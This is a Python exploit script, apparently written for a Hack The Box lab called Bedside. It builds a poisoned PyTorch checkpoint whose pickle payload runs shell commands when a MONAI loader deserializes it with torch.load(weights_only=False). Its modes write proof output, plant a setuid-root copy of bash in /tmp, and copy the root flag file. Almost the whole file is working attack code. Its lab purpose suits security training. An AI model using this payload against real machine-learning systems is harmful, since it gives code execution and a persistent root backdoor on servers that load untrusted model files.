#!/usr/bin/env python3
"""Construct the minimal checkpoint used for the HTB Bedside lab.

The MONAI CheckpointLoader on Bedside calls torch.load(weights_only=False).
The payload executes during pickle deserialization; the trainer can report a
later TypeError while this action has already completed.
"""
import argparse
import pickle
import zipfile
from pathlib import Path

parser = argparse.ArgumentParser(description=__doc__)
parser.add_argument('--mode', choices=('proof', 'suid-test', 'flag'), required=True)
parser.add_argument('--output', default='/datastore/checkpoints/checkpoint_epoch_999.pt')
args = parser.parse_args()
commands = {
    'proof': 'id > /tmp/root-proof.txt',
    'suid-test': 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash',
    'flag': 'cp /root/root.txt /tmp/bedside-root-flag && chmod 644 /tmp/bedside-root-flag',
}
command = commands[args.mode]

class RootPayload:
    def __reduce__(self):
        import subprocess
        return subprocess.check_output, (["/bin/sh", "-c", command],)

path = Path(args.output)
with zipfile.ZipFile(path, 'w') as archive:
    archive.writestr('archive/data.pkl', pickle.dumps(RootPayload(), protocol=2))
    archive.writestr('archive/version', '3')
    archive.writestr('archive/byteorder', 'little')
print(f'Created {path} ({args.mode})')
